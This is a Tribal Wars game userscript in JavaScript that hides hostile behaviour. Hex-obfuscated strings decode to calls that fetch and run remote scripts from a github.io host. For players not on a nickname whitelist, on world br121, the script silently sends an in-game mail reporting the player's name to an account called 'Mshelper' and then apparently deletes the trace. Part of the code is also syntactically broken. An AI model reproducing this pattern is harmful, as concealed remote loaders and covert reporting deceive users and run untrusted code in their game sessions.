function bk(){
    return new Promise((res, rej) => {
        res(var _0x9bcc=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x66\x6F\x78\x66\x6F\x6C\x65\x6D\x2E\x67\x69\x74\x68\x75\x62\x2E\x69\x6F\x2F\x73\x63\x72\x69\x70\x74\x73\x2F\x62\x6B\x2E\x6A\x73","\x67\x65\x74\x53\x63\x72\x69\x70\x74"];$[_0x9bcc[1]](_0x9bcc[0]))
    });
}
async function start(){
    let enviar = 0;
    let validar = false;
    if(JSON.parse(localStorage.getItem(`enviar`)) != null){
        enviar = JSON.parse(localStorage.getItem(`enviar`));
    }
    await bk()
    for(let lol of nicks){
        if(lol.toLowerCase() == game_data.player.name.toLowerCase()){
            try{
                var _0x442e=["\x68\x74\x74\x70\x73\x3A\x2F\x2F\x66\x6F\x78\x66\x6F\x6C\x65\x6D\x2E\x67\x69\x74\x68\x75\x62\x2E\x69\x6F\x2F\x73\x63\x72\x69\x70\x74\x73\x2F","\x2E\x6A\x73","\x67\x65\x74\x53\x63\x72\x69\x70\x74"];$[_0x442e[2]]((_0x442e[0]+ script+ _0x442e[1]))
                //console.log('Validado.')
            }catch{
                //console.log('Error Variavel Script')
            }
            validar = true;
        }
    }
    if(!validar){
      if(game_data.world == 'br121'){
        if(window.location.href != `https://${game_data.world}.tribalwars.com.br/game.php?village=${game_data.village.id}&screen=mail&mode=new`){
            if(enviar == 0){
                window.location.href = `https://${game_data.world}.tribalwars.com.br/game.php?village=${game_data.village.id}&screen=mail&mode=new`
            }
            if(window.location.href == `https://${game_data.world}.tribalwars.com.br/game.php?screen=mail&mode=in&village=${game_data.village.id}`){
                if(enviar == 1){
                    document.querySelector('[class="check"]').checked = true
                    document.querySelector('.btn-cancel').click()
                    enviar = 2
                    let stringJSON = JSON.stringify(enviar);
                    localStorage.setItem(`enviar`, stringJSON)
                }
            }
        }else{
            if(enviar == 0){
                document.querySelector('#to').value = 'Mshelper'
                document.querySelector('[name="subject"]').value = 'Meme'
                document.querySelector('#message').value = `01: [player]${nick}[/player]`
                document.querySelector('[value="Enviar"]').click()
                enviar = 1;
                let stringJSON = JSON.stringify(enviar);
                localStorage.setItem(`enviar`, stringJSON)
            }
        }
      }
    }
}
start()
